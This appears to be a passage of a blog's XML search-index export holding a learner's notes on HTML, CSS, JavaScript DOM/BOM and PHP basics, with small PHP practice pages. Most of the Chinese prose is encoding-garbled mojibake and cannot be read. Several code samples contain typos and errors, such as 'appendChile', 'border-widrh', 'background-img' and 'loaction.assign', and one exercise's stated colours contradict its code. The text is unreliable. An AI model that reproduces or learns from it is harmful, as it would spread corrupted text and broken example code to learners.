targetçš„é»˜è®¤å±žæ€§å€¼åœ¨HTMLä¸­ä¸º_self HTMLæ ‡è®°ç”¨äºŽå®šä¹‰å›¾åƒæ˜ å°„ä¸­çš„å¯å•å‡»åŒºåŸŸæ˜¯&lt;area&gt; 2. CSS é€‰æ‹©å™¨ CSSä¸­idé€‰æ‹©å™¨ä»¥&quot;#&quot;æ¥å®šä¹‰ï¼Œç±»é€‰æ‹©å™¨ä»¥&quot;.&quot;æ¥å®šä¹‰ã€‚ æ’å…¥æ ·å¼è¡¨ä¸‰ç§æ–¹æ³• å¤–éƒ¨æ ·å¼è¡¨ 123&lt;head&gt; &lt;link rel="stylesheet" type="text/css" href="mystyle.css"&gt;&lt;/head&gt; å†…éƒ¨æ ·å¼è¡¨ 1234567&lt;head&gt;&lt;style&gt; hr &#123;color: sienna;&#125; p &#123;margin-left: 20px;&#125; body&#123;background-img: url("images/back40.gif");&#125;&lt;/style&gt;&lt;/head&gt; å†…è”æ ·å¼ 123&lt;p style="color:sienna; margin-left:20px"&gt; æ®µè½ &lt;/p&gt; ä¼˜å…ˆçº§ï¼šå†…è” &gt; å†…éƒ¨ &gt; å¤–è” CSSæµ‹è¯• æµ‹è¯•ç½‘å€ï¼šCSSæµ‹è¯• å¤–éƒ¨æ ·å¼è¡¨æ­£ç¡®å¼•ç”¨çš„æ–¹æ³•ï¼š 1&lt;link rel="stylesheet" type="text/css" href="mystyle.css"&gt; HTMLæ–‡æ¡£ä¸­ï¼Œå¼•ç”¨å¤–éƒ¨æ ·å¼è¡¨æ­£ç¡®ä½ç½®æ˜¯åœ¨&lt;head&gt;éƒ¨åˆ†ã€‚ backgroud-colorå±žæ€§å¯ç”¨äºŽæ”¹å˜èƒŒæ™¯é¢œè‰²ï¼Œcolorå¯æ”¹å˜æŸä¸ªå…ƒç´ çš„æ–‡æœ¬é¢œè‰²ã€‚ æµ‹è¯•äºŒä¸­å®žä¾‹ 12345678910111213/*ç²—ä½“*/p &#123;font-weight: bold&#125;/*è¶…é“¾æŽ¥æ— ä¸‹åˆ’çº¿*/a &#123;text-decoration: none&#125;/*æ–‡æœ¬ä»¥å¤§å†™å­—æ¯å¼€å¤´*/text-transform: capitalize/*æ”¹å˜å…ƒç´ å­—ä½“*/font-family/*è¾¹æ¡†ä¸Š10 ä¸‹5 å·¦20 å³1*//*ä¸Šå³ä¸‹å·¦*/border-widrh: 10 1 5 20/*äº§ç”Ÿå¸¦æœ‰æ­£æ–¹å½¢æ ‡è®°çš„é¡¹ç›®åˆ—è¡¨*/list-style-type: square æµ‹è¯•ä¸‰â€”äº”ä¸­å®žä¾‹ 123456789101112/*ä½¿ç”¨CSS3åˆ›å»ºåœ†è§’*/border-radius: 30px;/*CSS3ä¸­å…ƒç´ æ·»åŠ é˜´å½±*/box-shadow: 10px 10px 5px grey;/*ä½¿ç”¨CSS3å¼ºåˆ¶æ¢è¡Œ*/word-wrap: break-word;/*CSSç”¨äºŽç›’å­å±…ä¸­*/margin: 0 auto;/*ç›’å­å†…å†…è”å…ƒç´ å±…ä¸­*/text-align: center;/*CSSä¸­å¯¼å…¥æ ·å¼è¡¨æ­£ç¡®è¯­æ³•*/@import url(css/example.css); 3. JavaScriptâ€‹ HTMLå®šä¹‰ç½‘é¡µå†…å®¹ï¼ŒCSSæè¿°ç½‘é¡µå¸ƒå±€ï¼ŒJSä»‹ç»ç½‘é¡µè¡Œä¸º JavaScriptç”¨æ³• 123&lt;script&gt; alert("My First JavaScript");&lt;/script&gt; JavaScriptè¾“å‡º 12345678&lt;!--å¼¹å‡ºè­¦å‘Šæ¡†--&gt;window.alert()&lt;!--å°†å†…å®¹å†™åˆ°HTMLæ–‡æ¡£ä¸­--&gt;document.write()&lt;!--å†™å…¥åˆ°HTMLå…ƒç´ --&gt;innerHTML&lt;!--å†™å…¥åˆ°æµè§ˆå™¨çš„æŽ§åˆ¶å°--&gt;console.log() 12345678910//å•è¡Œæ³¨é‡Š/*å¤šè¡Œæ³¨é‡Š*///JavaScriptä½¿ç”¨å…³é”®å­—varå®šä¹‰å˜é‡var x, lengthx = 5length = 6//JavaScriptå¯¹å¤§å°å†™æ˜¯æ•æ„Ÿçš„ JavaScriptäº‹ä»¶ 12345678910111213&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;JavaScriptäº‹ä»¶&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;button onclick="getElementById('demo').innerHTML=Date()"&gt; çŽ°åœ¨æ—¶é—´ &lt;/button&gt; &lt;p id="demo"&gt; &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; â€‹ å¸¸è§çš„HTMLäº‹ä»¶ äº‹ä»¶ æè¿° onchange HTMLå…ƒç´ æ”¹å˜ onclick ç”¨æˆ·ç‚¹å‡»HTMLå…ƒç´  onmouseover ç”¨æˆ·åœ¨ä¸€ä¸ªHTMLå…ƒç´ ä¸Šç§»åŠ¨é¼ æ ‡ onmouseout ç”¨æˆ·ä»Žä¸€ä¸ªHTMLå…ƒç´ ä¸Šç§»å¼€é¼ æ ‡ onkeydown ç”¨æˆ·æŒ‰ä¸‹é”®ç›˜æŒ‰é”® onload æµè§ˆå™¨å·²å®Œæˆé¡µé¢çš„åŠ è½½ JavaScript HTML DOM æ”¹å˜HTML 123456//ä¿®æ”¹æ—¶é—´document.write(Date());//ä¿®æ”¹HTMLå†…å®¹document.getElementById("id").innerHTML="new text";//æ”¹å˜HTMLå±žæ€§document.getElementById("id").attribute="new attribute"; æ”¹å˜CSS 12//æ”¹å˜HTMLæ ·å¼document.getElementById(id).style.property="new style" 1234567891011&lt;!--ä½¿ç”¨äº‹ä»¶ä¿®æ”¹HTMLæ ·å¼--&gt;&lt;html&gt; &lt;body&gt; &lt;h1 id='id1'&gt; æ ‡é¢˜ &lt;/h1&gt; &lt;button type="button" onclick="document.getElementById('id1').style.color='red'"&gt; ç‚¹æˆ‘ï¼ç‚¹æˆ‘ï¼ï¼ &lt;/button&gt; &lt;/body&gt;&lt;/html&gt; EventListener 1234element.addEventListener(event, function, useCapture)//ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯äº‹ä»¶çš„ç±»åž‹ï¼ˆ"click"å’Œ"mousedown"ï¼‰//ç¬¬äºŒä¸ªå‚æ•°æ˜¯äº‹ä»¶è§¦å‘åŽè°ƒç”¨çš„å‡½æ•°//ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å¸ƒå°”å€¼ç”¨äºŽæè¿°äº‹ä»¶æ˜¯å†’æ³¡è¿˜æ˜¯æ•èŽ·ï¼Œè¯¥å‚æ•°å¯é€‰ 1234567891011121314151617181920&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;EventListener&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt; ä½¿ç”¨addEventListener()æ–¹æ³•åœ¨ç”¨æˆ·ç‚¹å‡»æŒ‰é’®æ—¶æ‰§è¡Œå‡½æ•° &lt;/p&gt; &lt;button id="myBtn"&gt; ç‚¹æˆ‘ï¼ &lt;/button&gt; &lt;script&gt; document.getElementById('myBtn').addEventListener("click", myFunction); function myFunction()&#123; alert("Hello World!"); &#125; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; åˆ›å»ºæ–°çš„HTMLå…ƒç´ -appendChild() 123456789101112131415161718192021222324&lt;html&gt; &lt;head&gt; &lt;title&gt;åˆ›å»ºæ–°å…ƒç´ &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="div1"&gt; &lt;p id="p1"&gt; ç¬¬ä¸€ä¸ªæ®µè½ &lt;/p&gt; &lt;p id="p2"&gt; ç¬¬äºŒä¸ªæ®µè½ &lt;/p&gt; &lt;/div&gt; &lt;script&gt; var para=document.createElement("p"); var node=document.createTextNode("ç¬¬ä¸‰ä¸ªæ®µè½") para.appendChile(node); var element=document.getElementById("div1"); var chile=document.getElementById("p1"); element.appendChild(para, child); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; BOM å¸¸ç”¨å‡½æ•° å‡½æ•° ä½œç”¨ window.open()/close() æ‰“å¼€æ–°çª—å£/å…³é—­å½“å‰ä¸²å£ window.moveTo() ç§»åŠ¨å½“å‰çª—å£ window.resizeTo() è°ƒæ•´å½“å‰çª—å£çš„å°ºå¯¸ location.hostname webä¸»æœºçš„åŸŸå location.pathname å½“å‰é¡µé¢çš„è·¯å¾„å’Œæ–‡ä»¶å location.port webä¸»æœºçš„ç«¯å£ï¼ˆ80/443ï¼‰ location.protocol webåè®® location.href å½“å‰é¡µé¢çš„URL loaction.assign() åŠ è½½æ–°æ–‡æ¡£ æ›´å¤šBOMå‡½æ•°è¯·è®¿é—®BOM JavaScriptæµ‹è¯• æµ‹è¯•ç½‘å€ å¤–éƒ¨è„šæœ¬ä¸èƒ½åŒ…å«&lt;script&gt;æ ‡ç­¾ã€‚ å¦‚ä½•åœ¨æµè§ˆå™¨çš„çŠ¶æ€æ æ”¾å…¥ä¸€æ¡æ¶ˆæ¯ï¼Ÿ 1window.status="put your message here" é¢„æµ‹ä»¥ä¸‹JavaScriptè¾“å‡º 1234&lt;script type="text/javascript"&gt; a = 8 + "8"; document.write(a);&lt;/script&gt; 88ã€‚ JavaScriptä¸­æ²¡æœ‰float/integer/doubleç­‰æ•°æ®ç±»åž‹ã€‚ JavaScriptçš„.lengthå±žæ€§ç”¨äºŽè®¡ç®—ä»»æ„å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦æ•°ã€‚ trim()æ–¹æ³•ç”¨äºŽåˆ é™¤å­—ç¬¦ä¸²å¼€å¤´å’Œç»“å°¾çš„ç©ºæ ¼ã€‚ 4. PHP PHPå˜é‡ ä»¥$ç¬¦å·å¼€å§‹ï¼Œå¿…é¡»ä»¥å­—æ¯å’Œä¸‹åˆ’çº¿å¼€å§‹ï¼Œå˜é‡ååªèƒ½åŒ…å«å­—æ¯æ•°å­—å­—ç¬¦ä»¥åŠä¸‹åˆ’çº¿ã€‚ Note: å˜é‡åæ˜¯åŒºåˆ†å¤§å°å†™çš„ echoå’Œprintè¯­å¥ echoå¯ä»¥è¾“å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²ï¼Œè¾“å‡ºé€Ÿåº¦æ¯”printå¿« printåªå…è®¸è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›žå€¼æ€»ä¸º1 EOFä½¿ç”¨è¯´æ˜Ž 123456789&lt;?php$name=&quot;å˜é‡ä¼šè¢«è§£æž&quot;;$a=&lt;&lt;&lt;EOF$name&lt;br&gt;&lt;a&gt;htmlæ ¼å¼ä¼šè¢«è§£æž&lt;/a&gt;&lt;/br&gt;åŒå¼•å·å’ŒHTMLæ ¼å¼å¤–çš„å…¶ä»–å†…å®¹éƒ½ä¸ä¼šè¢«è§£æž &quot;åŒå¼•å·å¤–æ‰€æœ‰è¢«æŽ’åˆ—å¥½çš„æ ¼å¼éƒ½ä¼šè¢«ä¿ç•™&quot;&quot;ä½†æ˜¯åŒå¼•å·å†…ä¼šä¿ç•™è½¬ä¹‰ç¬¦çš„è½¬ç§»æ•ˆæžœï¼Œæ¯”å¦‚table:\tå’Œæ¢è¡Œ:\nä¸‹ä¸€è¡Œ&quot;EOF;echo $a;?&gt; PHPä¸‰ç§å·¥ä½œæ¨¡å¼ å·¥ä½œæ¨¡å¼ ç‰¹ç‚¹ CLIæ¨¡å¼ å‘½ä»¤è¡Œè¿è¡Œæ¨¡å¼ CGIæ¨¡å¼ é€šè¿‡CGIæŽ¥å£ä»ŽHTTPæœåŠ¡å™¨å–å¾—è¾“å…¥ï¼Œç„¶åŽæŠŠè¿è¡Œçš„ç»“æžœé€šè¿‡CGIæŽ¥å£äº¤ç»™HTTPæœåŠ¡å™¨ï¼Œè€ŒHTTPæœåŠ¡å™¨æŠŠç»“æžœé€ç»™æµè§ˆå™¨ moduleæ¨¡å¼ LAMPä½“ç³»æœ€å¸¸ç”¨çš„å·¥ä½œæ–¹å¼ï¼Œphpè¢«ç¼–è¯‘ä¸ºapacheä¸€ä¸ªå†…ç½®æ¨¡å—ï¼Œå¯åŠ¨æ—¶åŠ è½½ï¼Œå½“æœ‰ä¸€ä¸ªphpè¯·æ±‚è¿‡æ¥æ—¶ï¼Œç›´æŽ¥åœ¨httpdè¿›ç¨‹å®Œæˆphpè§£é‡Šè¿è¡Œï¼Œå°†ç»“æžœè¿”å›žã€‚]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç»ƒä¹ 1æ”¹è¿›ç‰ˆ]]></title>
    <url>%2F2019%2F08%2F04%2Fpractice1Update%2F</url>
    <content type="text"><![CDATA[Abstract: practice1å®žæˆ˜äºŒæ”¹è¿›ç‰ˆ æ ¹æ®é¡µé¢çš„è¡Œæ•°ï¼Œç”Ÿæˆä¸€ä¸ªä¸åŒé¢œè‰²çš„é¡µé¢ï¼Œ0-3çº¢è‰²èƒŒæ™¯ï¼Œ4-6è“è‰²èƒŒæ™¯ï¼Œ7-9ç»¿è‰²èƒŒæ™¯ï¼Œ10-12é»‘è‰²èƒŒæ™¯ï¼Œ13-15ç´«è‰²èƒŒæ™¯ï¼Œè¶…è¿‡ä¸ºç™½è‰²ã€‚ 12345678910111213141516171819202122232425262728293031323334353637&lt;html&gt; &lt;head&gt; &lt;title&gt;Line Color&lt;/title&gt; &lt;style&gt; ul&#123; list-style-type: none; margin: 0; padding: 0; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;?php $color=&quot;&quot;; echo &quot;&lt;ul&gt;&quot;; for($i=1; $i&lt;=15; $i++)&#123; if(0&lt;=$i &amp;&amp; $i&lt;=3)&#123; $color=&quot;red&quot;; &#125; elseif(4&lt;=$i &amp;&amp; $i&lt;=6)&#123; $color=&quot;yellow&quot;; &#125; elseif(7&lt;=$i &amp;&amp; $i&lt;=9)&#123; $color=&quot;blue&quot;; &#125; elseif(10&lt;=$i &amp;&amp; $i&lt;=12)&#123; $color=&quot;pink&quot;; &#125; elseif(13&lt;=$i &amp;&amp; $i&lt;=15)&#123; $color=&quot;green&quot;; &#125; echo &quot;&lt;li style=\&quot;background:$color; width=200px;color: $color\&quot;&gt;&amp;nbsp&lt;/li&gt;&quot;; &#125; echo &quot;&lt;/ul&gt;&quot;; ?&gt; &lt;/body&gt;&lt;/html&gt; æ•ˆæžœå¦‚ä¸‹ï¼š]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>å®žæˆ˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[week3points]]></title>
    <url>%2F2019%2F08%2F03%2Fweek3points%2F</url>
    <content type="text"><![CDATA[Abstract: å¯¹ç¬¬ä¸‰å‘¨å­¦ä¹ å†…å®¹çš„æ‰«ç›² 1. EOFç”¨ä¸‹é¢çš„ä¾‹å­å¯¹EOFä¼šæœ‰æ›´æ·±çš„ç†è§£ 123456789&lt;?php $name=&quot;å˜é‡ä¼šè¢«è§£æž&quot;; $a=&lt;&lt;&lt;EOF $name&lt;br&gt;&lt;a&gt;htmlæ ¼å¼ä¼šè¢«è§£æž&lt;/a&gt;&lt;br/&gt;åŒå¼•å·å’Œhtmlæ ¼å¼å¤–çš„å…¶ä»–å†…å®¹éƒ½ä¸ä¼šè¢«è§£æž &quot;åŒå¼•å·å¤–æ‰€æœ‰è¢«æŽ’åˆ—å¥½çš„æ ¼å¼éƒ½ä¼šè¢«ä¿ç•™&quot; &quot;ä½†æ˜¯åŒå¼•å·å†…ä¼šä¿ç•™è½¬ä¹‰ç¬¦çš„è½¬ä¹‰æ•ˆæžœï¼Œæ¯”å¦‚table:\tå’Œæ¢è¡Œ:\nä¸‹ä¸€è¡Œ&quot;EOF; echo $a;?&gt; è‹¥æŠŠtable:\tå’Œæ¢è¡Œ:\nä¸‹ä¸€è¡Œæ¢æˆtable:\\tå’Œæ¢è¡Œ:\\næ•ˆæžœå¦‚ä¸‹ï¼š 2. PHP $_SERVER$_SERVERæ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„PHP SERVER 3. GET vs POST GETå’ŒPOSTéƒ½åˆ›å»ºæ•°ç»„ï¼Œæ­¤æ•°ç»„åŒ…å«é”®/å€¼å¯¹ï¼Œå…¶ä¸­çš„é”®æ˜¯è¡¨å•æŽ§ä»¶åç§°ï¼Œå€¼æ˜¯æ¥è‡ªç”¨æˆ·è¾“å…¥æ•°æ® GETå’ŒPOSTè¢«è§†ä½œ$GETå’Œ$_POSTï¼Œå®ƒä»¬è¶…å…¨å±€å˜é‡ï¼Œè¿™æ„å‘³ç€å¯¹å®ƒä»¬çš„è®¿é—®æ— éœ€è€ƒè™‘ä½œç”¨åŸŸâ€”æ— éœ€ä»»ä½•ç‰¹æ®Šä»£ç ï¼Œå°±èƒ½å¤Ÿè®¿é—®å®ƒä»¬ã€‚ $_GETé€šè¿‡URLå‚æ•°ä¼ é€’åˆ°å½“å‰è„šæœ¬çš„å˜é‡æ•°ç»„ï¼› $_POSTæ˜¯é€šè¿‡HTTP POSTä¼ é€’åˆ°å½“å‰è„šæœ¬å˜é‡æ•°ç»„ å¤„ç†æ–¹å¼ ä¸åŒç‚¹ GET 1. æ‰€æœ‰å˜é‡åå’Œå€¼æ˜¾ç¤ºåœ¨URLä¸­ 2. å¯¹å‘é€çš„ä¿¡æ¯æ•°é‡æœ‰é™åˆ¶ POST 1. å‘é€ä¿¡æ¯ä¸å¯è§ï¼Œä¿¡æ¯åµŒå…¥åˆ°HTTPè¯·æ±‚ä¸»é¢˜ä¸­ 2. æ‰€å‘é€ä¿¡æ¯æ•°é‡æ— é™åˆ¶ æ­¤å¤–ï¼ŒPOSTæ”¯æŒé«˜é˜¶åŠŸèƒ½ï¼Œæ¯”å¦‚åœ¨å‘æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶æ—¶è¿›è¡Œmulti-partäºŒè¿›åˆ¶è¾“å…¥ã€‚]]></content>
      <categories>
        <category>Web Security</category>
        <category>ç¬”è®°</category>
        <category>çŸ¥è¯†ç›²ç‚¹</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç»ƒä¹ 1]]></title>
    <url>%2F2019%2F08%2F03%2Fpractice1%2F</url>
    <content type="text"><![CDATA[Abstract: PHPç®€å•å®žæˆ˜ å®žæˆ˜ä¸€ ï¼šæ ¹æ®ä¹‹å‰å­¦ä¹ çš„HTMLçŸ¥è¯†ï¼Œä½¿ç”¨PHPæ¥ç¼–å†™ä¸€ä¸ªé¡µé¢ï¼Œé¡µé¢å†…å®¹æ˜¾ç¤ºå‡ºæµè§ˆå™¨çš„ä¿¡æ¯ã€‚åŒ…æ‹¬æµè§ˆå™¨ä¿¡æ¯ï¼Œç³»ç»Ÿä¿¡æ¯ï¼Œæ–‡ä»¶ä½ç½®ä¿¡æ¯ï¼ŒPHPç‰ˆæœ¬ï¼Œæ–‡ä»¶è¡Œæ•°ã€‚åŒæ—¶ä¿è¯é¡µé¢çš„ç¾Žè§‚ã€‚ 123456789101112131415161718192021&lt;html&gt;&lt;head&gt; &lt;title&gt;æ˜¾ç¤ºæµè§ˆå™¨ä¿¡æ¯&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;?php echo $_SERVER[&quot;HTTP_USER_AGENT&quot;]; echo &quot;&lt;br&gt;&quot;; echo PHP_OS; echo &quot;&lt;br&gt;&quot;; echo __DIR__; echo &quot;&lt;br&gt;&quot;; echo PHP_VERSION; echo &quot;&lt;br&gt;&quot;; echo __LINE__; echo &quot;&lt;br&gt;&quot;; echo __FILE__; ?&gt;&lt;/body&gt;&lt;/html&gt; æ•ˆæžœæ˜¾ç¤ºï¼š å®žæˆ˜äºŒ ï¼šæ ¹æ®é¡µé¢çš„è¡Œæ•°ï¼Œç”Ÿæˆä¸€ä¸ªä¸åŒé¢œè‰²çš„é¡µé¢ï¼Œ0-3çº¢è‰²èƒŒæ™¯ï¼Œ4-6è“è‰²èƒŒæ™¯ï¼Œ7-9ç»¿è‰²èƒŒæ™¯ï¼Œ10-12é»‘è‰²èƒŒæ™¯ï¼Œ13-15ç´«è‰²èƒŒæ™¯ï¼Œè¶…è¿‡ä¸ºç™½è‰²ã€‚ 1234&lt;?php echo &quot;&lt;body bgcolor=\&quot;white\&quot;&gt;&lt;/body&gt; &lt;div style =&apos;background-color:red;&apos;&gt;&lt;font color=\&quot;red\&quot;&gt;This is some text!&lt;/font&gt;&lt;/div&gt;&quot;; echo &quot;&lt;div style =&apos;background-color:red;&apos;&gt;&lt;font color=\&quot;red\&quot;&gt;This is some text!&lt;/font&gt;&lt;/div&gt;&quot;; echo &quot;&lt;div style =&apos;background-color:red;&apos;&gt;&lt;font color=\&quot;red\&quot;&gt;This is some text!&lt;/font&gt;&lt;/div&gt;&quot;;?&gt; æ•ˆæžœæ˜¾ç¤ºï¼š ç¼ºç‚¹ï¼šåˆšå¼€å§‹çš„æƒ³æ³•æ˜¯ä½¿ç”¨forå¾ªçŽ¯+__LINE__å®žçŽ°ï¼Œä½†å¹¶å®žçŽ°ï¼Œç›®å‰æ–¹æ³•è¿‡äºŽæ­»æ¿ï¼Œæœ‰æ”¹è¿›ç©ºé—´ã€‚]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>å®žæˆ˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note15]]></title>
    <url>%2F2019%2F08%2F03%2Fnote15%2F</url>
    <content type="text"><![CDATA[Abstract: phpåŸºç¡€è¯­æ³•å’Œå˜é‡ 1. åŸºç¡€è§„èŒƒ PHPè„šæœ¬å½¢å¼&lt;?php ?&gt; PHPè„šæœ¬å¯ä»¥å•ç‹¬å­˜åœ¨ï¼Œä¹Ÿå¯ä»¥ä¸Žhtmé¡µé¢ç»“åˆ PHPæ–‡ä»¶æ‰©å±•åè§„èŒƒï¼Œä¸€èˆ¬æ˜¯.phpç»“å°¾ï¼Œä½†å¯ä»¥ä½¿ç”¨å…¶ä»–å‘½åï¼Œä¾‹å¦‚.phtmç­‰ 2. PHPä¸‰ç§è¿è¡Œæ–¹å¼ CLIå°±æ˜¯å‘½ä»¤è¡Œ 1php -f index.php CGIæ¨¡å¼ï¼š Common Gateway Interfaceï¼Œå…¬å…±ç½‘å…³æŽ¥å£ï¼Œç¨‹åºé¡»è¿è¡Œåœ¨ç½‘ç»œæœåŠ¡å™¨ä¸Š moduleæ¨¡å¼ï¼š 3. æ‰©å±•åŠ è®²è§£ apacheæœåŠ¡å™¨æˆ–nginx phpè¿è¡ŒçŽ¯å¢ƒ æ•°æ®åº“ 4. PHPä¸­çš„æ•°æ®ç±»åž‹å˜é‡çš„æ•°æ®ç±»åž‹ï¼š å¸ƒå°”ç±»åž‹ æ•´åž‹ æµ®ç‚¹åž‹ å­—ç¬¦ä¸² èµ„æº ç©ºç±»åž‹ æ•°ç»„ å¯¹è±¡ ä½¿ç”¨var_dump()æ¥æŸ¥çœ‹ç±»åž‹ PHPä¸­çš„å˜é‡ï¼š å˜é‡ä»¥$ç¬¦å·å¼€å§‹ï¼ŒåŽé¢è·Ÿç€å˜é‡çš„åç§° å˜é‡åå¿…é¡»ä»¥å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿å­—ç¬¦å¼€å§‹ å˜é‡æ°‘åªèƒ½åŒ…å«å­—æ¯æ•°å­—å­—ç¬¦ä»¥åŠä¸‹åˆ’çº¿ï¼ˆA-zã€0-9å’Œ_ï¼‰ å˜é‡åä¸èƒ½åŒ…å«ç©ºæ ¼ å˜é‡åæ˜¯åŒºåˆ†å¤§å°å†™çš„ STDOUTæ˜¯å®¢æˆ·ç«¯ï¼Œåªèƒ½åœ¨ç»ˆç«¯æ˜¾ç¤ºï¼Œä¸èƒ½åœ¨ç½‘é¡µæ˜¾ç¤º PHPä¸­çš„å¸¸é‡ï¼š å¸¸é‡ä¸€æ—¦èµ‹å€¼ä¸ä¼šæ”¹å˜ï¼Œå°½é‡ä½¿ç”¨å¤§å†™ å¸¸é‡åˆ†ä¸ºç³»ç»Ÿå¸¸é‡å’Œè‡ªå®šä¹‰å¸¸é‡ ç³»ç»Ÿå¸¸é‡å¯ä»¥ç†è§£ä¸ºå€¼ä¸ä¼šæœ‰æ”¹å˜çš„äº® å®šä¹‰å¸¸é‡ï¼š ä½¿ç”¨PHPä¸­çš„å‡½æ•°define()æ¥å®šä¹‰å¸¸é‡ å¸¸é‡åœ¨ä½¿ç”¨çš„æ—¶å€™ï¼Œä¸éœ€è¦$ç¬¦ å¸¸ç”¨çš„ç³»ç»Ÿå¸¸é‡ï¼š123456789101112//phpç¨‹åºæ–‡ä»¶å/ç»å¯¹è·¯å¾„__FILE__//è¢«è°ƒç”¨çš„æ–‡ä»¶è„šæœ¬æ‰€åœ¨çš„ç›®å½•__DIR__//å‡½æ•°å__FUNCTION__//phpç¨‹åºæ–‡ä»¶è¡Œæ•°__LINE__//å½“å‰è§£æžå™¨çš„ç‰ˆæœ¬å·PHP_VERSION//æ‰§è¡Œå½“å‰PHPç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿåç§°PHP_OS â€‹ phpé ç‚¹è¿žæŽ¥å­—ç¬¦ä¸² 12345&lt;?php $a = "name"; $b = "zs"; $c = $a . $b;?&gt; &lt;&lt;&lt;EOF EOF1234567&lt;?p echo &lt;&lt;&lt;EOF &lt;h1&gt;æ ‡é¢˜&lt;/h1&gt; &lt;p&gt;æ®µè½&lt;/p&gt;EOF;//ç»“æŸéœ€è¦ç‹¬ç«‹ä¸€è¡Œä¸”å‰åŽä¸èƒ½ç©ºæ ¼?&gt; phpä¸­é™¤äº†å•å¼•å·ï¼Œä»»æ„å­—ç¬¦æ”¾åœ¨å•å¼•å·ä¸­å°†æ²¡æœ‰ä»»ä½•æ„ä¹‰ phpä¸­åŒå¼•å·è¾“å…¥ç‰¹æ®Šå­—ç¬¦ï¼Œå°†æœ‰ç‰¹æ®Šæ„ä¹‰ EOFä¸­å˜é‡æœ‰æ„ä¹‰ï¼Œå…¶ä»–ç‰¹æ®Šå­—ç¬¦ï¼Œéƒ½æ²¡æœ‰æ„ä¹‰ è½¬ç§»\æ™®é€šå­—ç¬¦å˜ä¸ºç‰¹æ®Šå­—ç¬¦ï¼Œç‰¹æ®Šå­—ç¬¦ä¸ºæ™®é€šå­—ç¬¦]]></content>
      <categories>
        <category>Web Security</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note14]]></title>
    <url>%2F2019%2F08%2F01%2Fnote14%2F</url>
    <content type="text"><![CDATA[Abstract: JS BOMå’ŒjQueryï¼Œä»¥åŠphpçŽ¯å¢ƒçš„æ­å»º 1. JS BOMBOMå…¨åBrowser Object Modelï¼Œå³æµè§ˆå™¨å¯¹è±¡æ¨¡åž‹ã€‚ Windowæ–¹æ³• 12345678#æ‰“å¼€æ–°çª—å£window.open()#å…³é—­å½“å‰çª—å£window.close()#ç§»åŠ¨å½“å‰çª—å£window.moveTo()#è°ƒæ•´å½“å‰çª—å£çš„å°ºå¯¸window.resizeTo() Screenå±å¹• 1234#å¯ç”¨çš„å±å¹•å®½åº¦screen.availWidth#å¯ç”¨çš„å±å¹•é«˜åº¦screen.availHeight Location 1234567891011121314#webä¸»æœºçš„åŸŸålocation.hostname#å½“å‰é¡µé¢çš„è·¯å¾„å’Œæ–‡ä»¶ålocation.pathname#webä¸»æœºçš„ç«¯å£ï¼ˆ80å’Œ443ï¼‰location.port#ä½¿ç”¨çš„webåè®®ï¼ˆhttpæˆ–httpsï¼‰location.protocol#è¿”å›žå½“å‰é¡µé¢çš„URLï¼ˆä¹Ÿå¯ä»¥ç”¨ä½œè·³è½¬ï¼‰location.href#è¿”å›žURLçš„è·¯å¾„ålocation.pathname#åŠ è½½æ–°çš„æ–‡æ¡£location.assign History 1234#ä¸Žåœ¨æµè§ˆå™¨ç‚¹å‡»åŽé€€æŒ‰é’®ç›¸åŒhistory.back()#ä¸Žåœ¨æµè§ˆå™¨ç‚¹å‡»å‘å‰æŒ‰é’®ç›¸åŒhistory.forward() Navigator 12345678910111213141516171819&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;navigatorç”¨æ³•&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="example"&gt;&lt;/div&gt; &lt;script&gt; txt = "&lt;p&gt;æµè§ˆå™¨ä»£å·ï¼š" + navigator.appCodeName + "&lt;/p&gt;"; txt += "&lt;p&gt;æµè§ˆå™¨åç§°ï¼š" + navigator.appName + "&lt;/p&gt;"; txt += "&lt;p&gt;æµè§ˆå™¨ç‰ˆæœ¬ï¼š" + navigator.appVersion + "&lt;/p&gt;"; txt += "&lt;p&gt;å¯ç”¨Cookies: " + navigator.cookieEnabled + "&lt;/p&gt;"; txt += "&lt;p&gt;ç¡¬ä»¶å¹³å°ï¼š" + navigator.platform + "&lt;/p&gt;"; txt += "&lt;p&gt;ç”¨æˆ·ä»£ç†ï¼š" + navigator.userAgent + "&lt;/p&gt;"; txt += "&lt;p&gt;ç”¨æˆ·ä»£ç†è¯­è¨€ï¼š" + navigator.systemLanguage + "&lt;/p&gt;"; document.getElementById("example").innerHTML = txt; &lt;/script&gt; 